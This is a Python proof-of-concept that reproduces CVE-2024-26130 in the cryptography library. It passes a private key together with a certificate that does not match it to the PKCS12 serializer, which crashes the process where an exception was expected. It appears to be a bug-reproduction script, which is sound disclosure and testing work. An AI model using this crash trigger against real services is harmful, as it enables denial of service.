import cryptography
import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import PrivateFormat
import base64
import asyncio
from multiprocessing import Process, Manager


print("Demonstrating CVE-2024-26130")


class Demo:
    def __init__(self) -> None:
        self.time = datetime.datetime.utcnow()
        self.key1 = rsa.generate_private_key(
            public_exponent=65537, key_size=4096)
        self.key2 = rsa.generate_private_key(
            public_exponent=65537, key_size=4096)
        self.cert1 = build_cert(self.key1)
        self.cert2 = build_cert(self.key2)
        self.encryption_algorithm = PrivateFormat.PKCS12.encryption_builder().hmac_hash(
            cryptography.hazmat.primitives.hashes.SHA256()).build(b'password')
        self.bypass_result = None
        self.correct_result = None
        self.incorrect = None
        # self.testCorrect()
        # self.bypass()
        # self.testIncorrect()



    def testCorrect(self, dic):
        dic['data'] = ''
        dic['error'] = ''
        cert1 = build_cert(self.key1)
        pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
            name=b'empty',
            key=self.key1,
            cert=self.cert1,
            cas=[],
            encryption_algorithm=self.encryption_algorithm
        )
        # print("pkcs12_data: ", pkcs12_data.decode('utf-8', 'ignore'))
        # deserialize
        key, cert, cas = cryptography.hazmat.primitives.serialization.pkcs12.load_key_and_certificates(
            pkcs12_data,
            b'password'
        )
        self.correct_result = pkcs12_data

        print("Correct test succeeded.")
        return pkcs12_data

    def bypass(self):
        try:
            pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
                name=b'test',
                key=self.key1,
                cert=self.cert2,
                cas=[],
                encryption_algorithm=self.encryption_algorithm
            )
        except Exception as e:
            print("Exception thrown: ", e)
            return
        print("Bypass test succeeded.")
        return pkcs12_data

def testIncorrect(dic):
    print("should throw exception or print success message. Instead we crash")
    dic['data'] = ''
    dic['error'] = ''
    key1 = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    key2 = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    cert1 = build_cert(key1)
    cert2 = build_cert(key2)
    encryption_algorithm = PrivateFormat.PKCS12.encryption_builder().hmac_hash(
            cryptography.hazmat.primitives.hashes.SHA256()).build(b'password')
    try:
        pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
            name=b'test',
            key=key1,
            cert=cert2,
            cas=[],
            encryption_algorithm=encryption_algorithm
        )
    except Exception as e:
        print("Exception thrown: ", e)
        dic['error'] = e
        return
    dic['data'] = pkcs12_data
    print("Incorrect test succeeded.")

    return pkcs12_data


def build_cert(key):
    time = datetime.datetime.utcnow()
    cert = cryptography.x509.CertificateBuilder().subject_name(
        cryptography.x509.Name([
            cryptography.x509.NameAttribute(
                cryptography.x509.oid.NameOID.COMMON_NAME, 'test'),
        ])
    ).issuer_name(
        cryptography.x509.Name([
            cryptography.x509.NameAttribute(
                cryptography.x509.oid.NameOID.COMMON_NAME, 'test'),
        ])
    ).public_key(
        key.public_key()
    ).serial_number(
        cryptography.x509.random_serial_number()
    ).not_valid_before(
        time
    ).not_valid_after(
        time + datetime.timedelta(days=1)
    ).sign(
        key,
        cryptography.hazmat.primitives.hashes.SHA512()
    )
    return cert



def main():
    # d = Demo()
    print("in main")
    with Manager() as manager:
        d = Demo()
        res1 = manager.dict()
        t1 = Process(target=d.testCorrect, args=(res1,))
        t1.start()
        t1.join()
        print("res1: ", res1)
    # t2 = Process(target=d.bypass)
        res2 = manager.dict()
        t3 = Process(target=testIncorrect, args=(res2,) )
        t3.start()
        t3.join()
        print("res: ", res2)
    



if __name__ == '__main__':
    print(cryptography.__version__)
    main()

